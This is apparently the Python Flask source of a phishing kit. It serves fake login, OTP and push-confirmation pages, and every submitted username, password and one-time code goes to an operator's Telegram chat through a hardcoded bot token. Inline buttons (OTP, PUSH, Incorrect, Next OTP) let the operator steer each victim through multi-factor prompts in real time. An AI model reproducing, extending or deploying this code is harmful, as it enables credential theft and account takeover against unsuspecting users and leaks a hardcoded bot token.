from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)


user_statuses = {}

def send_message_telegram(chat_id, message_text, reply_markup, token):
    url = f"https://api.telegram.org/bot{token}/sendMessage"

    keyboard = {
        "inline_keyboard": reply_markup
    }

    payload = {
        'chat_id': chat_id,
        'text': message_text,
        'reply_markup': keyboard
    }

    response = requests.post(url, json=payload)

    return response

@app.route('/')
def hello_world():  # put application's code here
    return render_template('index.html')


@app.route('/login')
def login():
    return render_template('login.html')


@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    user_statuses[data['login']] = 'pending'
    text = (f"Login: {data['login']}\n"
            f"Indy: {data['password']}")
    keyboard = [
        [{"text": 'OTP', 'callback_data': f'otp_{data["login"]}'}],
        [{"text": 'PUSH', 'callback_data': f'push_{data["login"]}'}],
        [{"text": 'Incorrect', 'callback_data': f'incorrect_{data["login"]}'}],
    ]

    response = send_message_telegram(
        '6283025003',
        message_text=text,
        reply_markup=keyboard,
        token='7856539018:AAEJX4600PfjJ80uJ8bsPdQatfaJ1XMTlWU'
    )
    print(response)


@app.route('/update_status', methods=['POST'])
def update_status():
    data = request.json
    user_statuses[data['user']] = data['status']
    return "ok"


@app.route('/check_status/<username>', methods=['POST', 'GET'])
def check_status(username):
    if username in user_statuses:
        return jsonify(user_statuses[username]), 200
    return jsonify({'error': 'Пользователь не найден'}), 404


@app.route('/login/otp/<username>')
def otp(username):
    return render_template('otp.html')


@app.route('/login/otp2/<username>')
def otp2(username):
    return render_template('otp2.html')


@app.route('/submit_otp', methods=['POST', 'GET'])
def submit_otp():
    data = request.json
    print(data)
    user_statuses[data['username']] = 'otp_submit'
    text = (f"Login: {data['username']}\n"
            f"OTP: {data['otp']}")
    keyboard = [
        [{"text": 'Next OTP', 'callback_data': f'otp_next_{data["username"]}'}],
        [{"text": 'Incorrect', 'callback_data': f'otp_incorrect_{data["username"]}'}],
    ]

    response = send_message_telegram(
        '6283025003',
        message_text=text,
        reply_markup=keyboard,
        token='7856539018:AAEJX4600PfjJ80uJ8bsPdQatfaJ1XMTlWU'
    )
    print(response)


@app.route('/submit_otp2', methods=['POST', 'GET'])
def submit_otp2():
    data = request.json
    print(data)
    user_statuses[data['username']] = 'otp2_submit'
    text = (f"Login: {data['username']}\n"
            f"OTP2: {data['otp']}")
    keyboard = [
        [{"text": 'Incorrect', 'callback_data': f'otp2_incorrect_{data["username"]}'}],
    ]

    response = send_message_telegram(
        '6283025003',
        message_text=text,
        reply_markup=keyboard,
        token='7856539018:AAEJX4600PfjJ80uJ8bsPdQatfaJ1XMTlWU'
    )
    print(response)


@app.route('/push_confirm')
def push_confirm():
    return render_template('push.html')


if __name__ == '__main__':
    app.run(host="127.0.0.1", port=5000, debug=True)
